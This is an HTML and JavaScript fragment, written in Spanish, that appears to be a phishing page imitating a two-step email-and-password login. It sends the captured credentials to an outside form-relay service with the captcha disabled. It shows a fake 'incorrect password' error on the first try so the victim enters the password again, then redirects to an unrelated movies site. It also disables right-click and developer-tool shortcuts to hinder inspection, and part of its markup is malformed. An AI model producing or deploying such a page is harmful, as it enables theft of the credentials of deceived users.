    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          style="display: flex; flex-direction: column; gap: 20px;">

      <!-- Paso 1: Correo -->
      <div id="step1">
        <input 
          id="correo"
          name="correo" 
          placeholder="Correo electrónico o teléfono" 
          type="email" 
          required

        </div>

          <a href="#" style="color: #2563EB; font-size: 14px; text-decoration: none;">Crear cuenta</a>
          <button type="button" 
                  id="btnNext1"
                  style="background-color: #2563EB; color: white; padding: 8px 24px; border-radius: 8px; font-weight: 500; border:none; cursor:pointer;">

          </button>
        </div>
      </div>

      <!-- Paso 2: Contraseña (oculto al inicio) -->
      <div id="step2" style="display: none;">
        <p style="color: #374151; font-size: 14px; margin-bottom: 8px;">Introduce tu contraseña</p>

        <input id="nombre" 
               name="nombre" 
               placeholder="Ingresa tu contraseña" 
               type="password" 
               required
               style="width: 100%; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px; font-size: 16px; box-sizing: border-box; outline: none;">
        <p id="errorNombre" style="color: #DC2626; font-size: 14px; margin-top: 4px; display:none;">Contraseña incorrecta</p>

        <!-- Hidden fields -->
        <input type="hidden" name="_next" value="https://samir2212-f.github.io/">
        <input type="hidden" name="_captcha" value="false">

        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 24px;">
          <a href="#" style="color: #2563EB; font-size: 14px; text-decoration: none;">¿Olvidaste tu contraseña?</a>
          <button type="submit" 
                  style="background-color: #2563EB; color: white; padding: 8px 24px; border-radius: 8px; font-weight: 500; border:none; cursor:pointer;">
            Siguiente
          </button>
        </div>
      </div>
    </form>

  <!-- Script -->
  <script>
    let intentoNombre = 0;

    // Paso de correo → contraseña
    document.getElementById("btnNext1").addEventListener("click", function() {
      const correo = document.getElementById("correo").value.trim();
      if (correo === "") {
        alert("Por favor ingresa tu correo");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    });

    // Validación contraseña
    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      intentoNombre++;

      if (intentoNombre < 2) { 
        errorMsg.style.display = "block";
        nombre.style.borderColor = "#DC2626";
        errorMsg.textContent = "Contraseña incorrecta";
        e.preventDefault();
      } else {
        errorMsg.style.display = "none";
        nombre.style.borderColor = "#D1D5DB";

        // ✅ Cuando ya se permite enviar, se redirige manualmente
        setTimeout(() => {
          window.location.href = "https://samir2212-f.github.io/pelis/";
        }, 1500); // espera 1.5 segundos antes de redirigir
      }
    });

    // 🚫 Bloquear clic derecho e inspección
    document.addEventListener("contextmenu", e => e.preventDefault()); 
    document.onkeydown = function(e) {
      if (e.keyCode == 123) return false; // F12
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Ctrl+Shift+I
      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Ctrl+U
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Ctrl+Shift+J
    };
  </script>
